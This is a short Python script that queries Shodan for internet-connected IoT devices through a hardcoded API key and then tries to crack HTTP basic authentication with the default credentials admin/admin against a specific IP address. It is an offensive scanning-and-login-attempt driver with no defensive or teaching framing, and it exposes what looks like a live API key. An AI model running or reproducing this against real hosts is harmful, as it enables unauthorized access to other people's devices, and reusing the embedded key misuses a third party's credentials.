from shodan_api import Shodanbrowser
import requests
from cracker import Cracker

def main():
    browser = Shodanbrowser("wdIjyg7aUyE0SEzSCgDQnkXtEMKLNhd4")
    query_text = input()
    dispos=browser.searchiotdevices(query_text)
    print(dispos)

    cr = Cracker('http://51.15.75.151:80')
    cr.basicauthcrack('admin','admin')


main()
